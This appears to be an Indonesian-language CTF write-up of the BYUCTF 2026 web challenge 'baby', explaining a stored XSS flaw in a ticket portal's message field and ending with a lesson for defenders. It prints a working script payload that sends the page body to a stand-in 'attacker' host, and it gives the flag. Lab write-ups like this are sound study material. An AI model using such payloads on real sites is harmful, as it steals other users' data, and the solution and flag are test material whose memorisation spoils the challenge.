---
ctf: "BYUCTF 2026"
kategori: "Web Exploitation"
challenge: "baby"
flag: "byuctf{s33_1t5_3asy!}"
teknik: "Stored XSS — field message dirender mentah; bot admin headless membocorkan document.body"
---

# baby — BYUCTF 2026 (Web Exploitation)

## Deskripsi Singkat

Sebuah "Support Ticket Portal" menerima `subject` + `message`. Halaman `/tickets` digerbangi cookie dan dikunjungi berkala oleh bot admin headless.

## Analisis

Renderer-nya meng-HTML-escape `subject` tapi menginterpolasikan `message` sebagai HTML mentah — stored XSS klasik. Flag-nya hardcoded di dalam template `/tickets` itu sendiri, jadi target eksfiltrasinya adalah `document.body.innerHTML`, bukan sekadar cookie.

## Eksploitasi / Solusi

```html
<!-- POST /submit -->
subject: x
message: <script>fetch("https://attacker/x?b=" + encodeURIComponent(document.body.innerHTML.slice(0,4000)))</script>
```

Dalam ~10 detik webhook-nya terpicu dengan daftar ticket yang sudah dirender — beserta blok flag di bagian atas `<div class="container">`:

```
byuctf{s33_1t5_3asy!}
```

## Catatan / Insight

**Pelajaran untuk defender:** *"HTML-escape input user"* harus berlaku untuk setiap titik interpolasi, bukan cuma yang kamu ingat. Stored XSS dengan bot headless yang punya privilese adalah serangan tahun 2008 yang masih menaklukkan aplikasi SaaS di tahun 2026.

## Flag

```
byuctf{s33_1t5_3asy!}
```
